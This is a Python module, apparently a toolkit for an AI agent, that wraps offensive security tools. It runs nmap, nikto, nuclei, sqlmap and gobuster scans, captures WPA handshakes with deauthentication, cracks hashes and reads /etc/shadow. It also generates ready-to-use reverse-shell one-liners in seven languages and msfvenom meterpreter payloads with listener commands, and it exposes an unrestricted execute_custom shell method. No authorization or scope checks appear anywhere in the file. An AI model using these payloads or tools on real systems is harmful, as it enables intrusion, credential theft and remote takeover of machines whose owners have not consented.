"""
CyberSecurity Tools — Executable security assessment utilities.
Wraps common pentest tools available on the operator's system.
"""

import asyncio
import logging
import subprocess
import socket
import os
import json
import re
from typing import Dict, Any, List, Optional

logger = logging.getLogger("CyberTools")


class CyberSecurityTools:
    """Collection of cybersecurity tool wrappers for the agent."""

    def __init__(self):
        self.logger = logging.getLogger("CyberSecurityTools")

    # ══════════════════════════════════════════════════════
    # NETWORK RECONNAISSANCE
    # ══════════════════════════════════════════════════════

    async def port_scan(self, target: str, ports: str = "1-1024", args: str = "-sV -sC") -> str:
        """Run nmap scan against a target."""
        cmd = f"nmap {args} -p {ports} {target}"
        return await self._run_shell(cmd)

    async def ping_sweep(self, subnet: str) -> str:
        """Discover live hosts on a subnet."""
        cmd = f"nmap -sn {subnet}"
        return await self._run_shell(cmd)

    async def dns_lookup(self, domain: str) -> str:
        """Perform DNS enumeration."""
        results = []
        for record_type in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
            cmd = f"nslookup -type={record_type} {domain}"
            out = await self._run_shell(cmd)
            if out.strip():
                results.append(f"=== {record_type} Records ===\n{out}")
        return "\n".join(results)

    async def whois_lookup(self, target: str) -> str:
        """WHOIS lookup for a domain or IP."""
        cmd = f"whois {target}" if os.name != "nt" else f"powershell -Command \"Invoke-WebRequest -Uri 'https://whois.arin.net/rest/ip/{target}' -Headers @{{Accept='text/plain'}} | Select-Object -ExpandProperty Content\""
        return await self._run_shell(cmd)

    async def traceroute(self, target: str) -> str:
        """Trace network path to target."""
        cmd = f"tracert {target}" if os.name == "nt" else f"traceroute {target}"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # VULNERABILITY SCANNING
    # ══════════════════════════════════════════════════════

    async def vuln_scan(self, target: str) -> str:
        """Run nmap vulnerability scan scripts."""
        cmd = f"nmap --script vuln {target}"
        return await self._run_shell(cmd)

    async def nikto_scan(self, target: str) -> str:
        """Run Nikto web vulnerability scanner."""
        cmd = f"nikto -h {target}"
        return await self._run_shell(cmd)

    async def nuclei_scan(self, target: str, templates: str = "") -> str:
        """Run Nuclei vulnerability scanner."""
        t_flag = f"-t {templates}" if templates else ""
        cmd = f"nuclei -u {target} {t_flag} -silent"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # WEB APPLICATION TESTING
    # ══════════════════════════════════════════════════════

    async def dir_bruteforce(self, url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
        """Directory brute-forcing with gobuster/ffuf."""
        cmd = f"gobuster dir -u {url} -w {wordlist} -q"
        result = await self._run_shell(cmd)
        if "command not found" in result.lower() or "not recognized" in result.lower():
            cmd = f"ffuf -u {url}/FUZZ -w {wordlist} -mc 200,301,302,403 -s"
            result = await self._run_shell(cmd)
        return result

    async def subdomain_enum(self, domain: str) -> str:
        """Enumerate subdomains."""
        cmd = f"subfinder -d {domain} -silent"
        result = await self._run_shell(cmd)
        if "not recognized" in result.lower():
            cmd = f"amass enum -passive -d {domain}"
            result = await self._run_shell(cmd)
        return result

    async def sqlmap_scan(self, url: str, params: str = "") -> str:
        """Run SQLMap against a URL."""
        extra = params if params else "--batch --level=3 --risk=2"
        cmd = f"sqlmap -u \"{url}\" {extra}"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # WIFI OPERATIONS
    # ══════════════════════════════════════════════════════

    async def wifi_scan(self) -> str:
        """Scan for nearby WiFi networks."""
        if os.name == "nt":
            cmd = "netsh wlan show networks mode=bssid"
        else:
            cmd = "iwlist wlan0 scan 2>/dev/null || nmcli dev wifi list"
        return await self._run_shell(cmd)

    async def wifi_interfaces(self) -> str:
        """List wireless interfaces."""
        if os.name == "nt":
            cmd = "netsh wlan show interfaces"
        else:
            cmd = "iwconfig 2>/dev/null; echo '---'; iw dev"
        return await self._run_shell(cmd)

    async def monitor_mode(self, interface: str = "wlan0", action: str = "start") -> str:
        """Enable/disable monitor mode on a wireless interface."""
        if action == "start":
            cmds = [
                f"airmon-ng check kill",
                f"airmon-ng start {interface}"
            ]
        else:
            cmds = [f"airmon-ng stop {interface}mon"]
        results = []
        for cmd in cmds:
            results.append(await self._run_shell(cmd))
        return "\n".join(results)

    async def capture_handshake(self, bssid: str, channel: str, interface: str = "wlan0mon") -> str:
        """Capture WPA handshake (requires monitor mode)."""
        cmd = f"airodump-ng --bssid {bssid} -c {channel} -w /tmp/capture {interface}"
        return f"Execute in terminal:\n{cmd}\n\nThen deauth with:\naireplay-ng -0 5 -a {bssid} {interface}"

    # ══════════════════════════════════════════════════════
    # PASSWORD & HASH OPERATIONS
    # ══════════════════════════════════════════════════════

    async def identify_hash(self, hash_value: str) -> str:
        """Identify hash type."""
        cmd = f"hashid '{hash_value}'"
        result = await self._run_shell(cmd)
        if "not recognized" in result.lower():
            return self._identify_hash_manual(hash_value)
        return result

    def _identify_hash_manual(self, h: str) -> str:
        """Manual hash identification by length/pattern."""
        h = h.strip()
        length = len(h)
        patterns = {
            32: "MD5 / NTLM / MD4",
            40: "SHA-1 / MySQL5",
            56: "SHA-224",
            64: "SHA-256 / SHA3-256",
            96: "SHA-384",
            128: "SHA-512 / SHA3-512 / Whirlpool",
        }
        if h.startswith("$2b$") or h.startswith("$2a$"):
            return "bcrypt"
        if h.startswith("$6$"):
            return "SHA-512 Crypt (Linux shadow)"
        if h.startswith("$5$"):
            return "SHA-256 Crypt (Linux shadow)"
        if h.startswith("$1$"):
            return "MD5 Crypt (Linux shadow)"
        return patterns.get(length, f"Unknown hash (length={length})")

    async def crack_hash(self, hash_value: str, hash_type: str = "auto", wordlist: str = "") -> str:
        """Crack a hash with hashcat or john."""
        wl = wordlist or "/usr/share/wordlists/rockyou.txt"
        if hash_type == "auto":
            cmd = f"hashcat -a 0 '{hash_value}' {wl} --identify"
        else:
            cmd = f"hashcat -m {hash_type} -a 0 '{hash_value}' {wl}"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # SYSTEM ENUMERATION
    # ══════════════════════════════════════════════════════

    async def system_info(self) -> str:
        """Gather local system information for priv esc analysis."""
        if os.name == "nt":
            cmds = ["systeminfo", "whoami /all", "net user", "netstat -ano"]
        else:
            cmds = ["uname -a", "id", "cat /etc/os-release", "ss -tulnp"]
        results = []
        for cmd in cmds:
            out = await self._run_shell(cmd)
            results.append(f"=== {cmd} ===\n{out}")
        return "\n\n".join(results)

    async def find_suid(self) -> str:
        """Find SUID binaries (Linux priv esc)."""
        cmd = "find / -perm -4000 -type f 2>/dev/null"
        return await self._run_shell(cmd)

    async def dump_hashes(self) -> str:
        """Attempt to dump password hashes."""
        if os.name == "nt":
            cmd = "powershell -Command \"Get-LocalUser | Select-Object Name, Enabled, LastLogon\""
        else:
            cmd = "cat /etc/shadow 2>/dev/null || echo 'Permission denied - need root'"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # EXPLOIT & PAYLOAD GENERATION
    # ══════════════════════════════════════════════════════

    async def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str = "python") -> str:
        """Generate reverse shell one-liners."""
        shells = {
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
        }
        if shell_type == "all":
            return "\n\n".join(f"=== {k.upper()} ===\n{v}" for k, v in shells.items())
        return shells.get(shell_type, f"Unknown shell type. Available: {', '.join(shells.keys())}")

    async def msfvenom_payload(self, lhost: str, lport: int, platform: str = "windows", fmt: str = "exe") -> str:
        """Generate msfvenom payload command."""
        payloads = {
            "windows": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {fmt} -o shell.{fmt}",
            "linux": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
            "android": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.apk",
            "php": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php",
            "python": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.py",
        }
        cmd = payloads.get(platform, payloads["windows"])
        listener = f"\n\nListener:\nmsfconsole -q -x 'use exploit/multi/handler; set payload {platform}/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j'"
        return cmd + listener

    # ══════════════════════════════════════════════════════
    # NETWORK ANALYSIS
    # ══════════════════════════════════════════════════════

    async def arp_scan(self, interface: str = "") -> str:
        """ARP scan the local network."""
        if os.name == "nt":
            cmd = "arp -a"
        else:
            iface = f"-I {interface}" if interface else ""
            cmd = f"arp-scan -l {iface} 2>/dev/null || arp -a"
        return await self._run_shell(cmd)

    async def netstat_info(self) -> str:
        """Show active network connections."""
        cmd = "netstat -ano" if os.name == "nt" else "ss -tulnp"
        return await self._run_shell(cmd)

    async def packet_capture(self, interface: str = "", count: int = 100, filter_expr: str = "") -> str:
        """Capture network packets."""
        f = f"-f '{filter_expr}'" if filter_expr else ""
        i = f"-i {interface}" if interface else ""
        cmd = f"tcpdump {i} -c {count} {f} -nn"
        return await self._run_shell(cmd)

    # ══════════════════════════════════════════════════════
    # PYTHON-NATIVE TOOLS (No external deps required)
    # ══════════════════════════════════════════════════════

    def python_port_scan(self, target: str, start_port: int = 1, end_port: int = 1024) -> str:
        """Pure Python port scanner (no nmap needed)."""
        open_ports = []
        for port in range(start_port, end_port + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except OSError:
                        service = "unknown"
                    open_ports.append(f"  Port {port}/tcp  OPEN  ({service})")
                sock.close()
            except Exception:
                pass
        if open_ports:
            return f"Open ports on {target}:\n" + "\n".join(open_ports)
        return f"No open ports found on {target} in range {start_port}-{end_port}"

    def python_banner_grab(self, target: str, port: int) -> str:
        """Grab service banner from a port."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port))
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(4096).decode("utf-8", errors="replace")
            sock.close()
            return f"Banner from {target}:{port}:\n{banner}"
        except Exception as e:
            return f"Failed to grab banner: {e}"

    # ══════════════════════════════════════════════════════
    # SHELL EXECUTOR
    # ══════════════════════════════════════════════════════

    async def _run_shell(self, cmd: str, timeout: int = 60) -> str:
        """Execute a shell command and return output."""
        self.logger.info(f"Executing: {cmd}")
        try:
            if os.name == "nt":
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True
                )
            else:
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode("utf-8", errors="replace")
            errors = stderr.decode("utf-8", errors="replace")
            return (output + "\n" + errors).strip() if errors else output.strip()
        except asyncio.TimeoutError:
            return f"Command timed out after {timeout}s: {cmd}"
        except Exception as e:
            return f"Execution error: {e}"

    async def execute_custom(self, command: str) -> str:
        """Execute any custom shell command."""
        return await self._run_shell(command)
